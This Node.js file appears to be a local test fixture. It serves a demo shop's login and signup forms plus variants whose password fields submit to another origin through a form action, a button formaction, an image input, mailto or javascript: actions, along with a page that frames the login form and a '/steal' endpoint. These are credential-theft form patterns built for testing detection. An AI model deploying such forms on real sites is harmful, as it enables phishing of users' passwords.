// A tiny site with login and signup forms, plus a page on another origin that frames it.
import http from 'node:http'
const page = (title, body) => `<!doctype html><html><head><meta charset=utf-8><title>${title}</title>
<style>body{font:16px system-ui;max-width:420px;margin:60px auto;padding:0 16px}input,button{display:block;width:100%;margin:8px 0 16px;padding:10px;font:inherit;box-sizing:border-box}</style></head><body>${body}</body></html>`
const login = page('Demo shop: sign in', `<h1>Demo shop</h1><form method=post action=/welcome>
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=password type=password autocomplete=current-password></label>
<button type=submit>Sign in</button></form>`)
const signup = page('Demo shop: create account', `<h1>Create your account</h1><form method=post action=/welcome>
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=pw1 type=password autocomplete=new-password></label>
<label>Confirm password<input name=pw2 type=password autocomplete=new-password></label>
<button type=submit>Create account</button></form>`)
const offsite = page('Off-site form', `<h1>Demo shop</h1><form method=post action=http://127.0.0.1:${process.argv[3]}/steal>
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=password type=password></label><button type=submit>Sign in</button></form>`)
// A same-origin action, but the button sends the form to another site.
const formaction = page('Off-site button', `<h1>Demo shop</h1><form method=post action=/welcome>
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=password type=password></label><button type=submit formaction=http://127.0.0.1:${process.argv[3]}/steal>Sign in</button></form>`)
const outside = page('Off-site outside button', `<h1>Demo shop</h1><form id=f method=post action=/welcome>
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=password type=password></label></form>
<button form=f type=submit formaction=http://127.0.0.1:${process.argv[3]}/steal>Sign in</button>`)
const mailto = page('Mail form', `<h1>Demo shop</h1><form method=post action="mailto:x@localhost" enctype=text/plain>
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=password type=password></label><button type=submit>Sign in</button></form>`)
const image = page('Off-site image button', `<h1>Demo shop</h1><form method=post action=/welcome>
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=password type=password></label><input type=image alt="Sign in" formaction=http://127.0.0.1:${process.argv[3]}/steal></form>`)
const scripted = page('Scripted sign-in', `<h1>Demo shop</h1><form action="javascript:void(0)">
<label>Email<input name=email type=email autocomplete=username></label>
<label>Password<input name=password type=password></label><button type=submit>Sign in</button></form>`)
function serve(port, routes) {
  http.createServer((req, res) => {
    let body = ''
    req.on('data', (c) => (body += c))
    req.on('end', () => {
      const r = routes[req.url.split('?')[0]]
      res.writeHead(r ? 200 : 404, { 'content-type': 'text/html' })
      res.end(r ? (typeof r === 'function' ? r(body) : r) : 'not found')
    })
  }).listen(port, '127.0.0.1')
}
const [a, b] = [Number(process.argv[2]), Number(process.argv[3])]
serve(a, { '/login': login, '/signup': signup, '/offsite': offsite, '/formaction': formaction, '/outside': outside, '/mailto': mailto, '/image': image, '/scripted': scripted, '/welcome': (b) => page('Welcome', `<h1>Welcome</h1><p id=got>${new URLSearchParams(b).get('email') ?? ''}</p>`) })
serve(b, { '/frame': page('Framing page', `<h1>Another site</h1><iframe src="http://localhost:${a}/login" width=460 height=420></iframe>`), '/steal': 'stolen' })
console.log('site up')
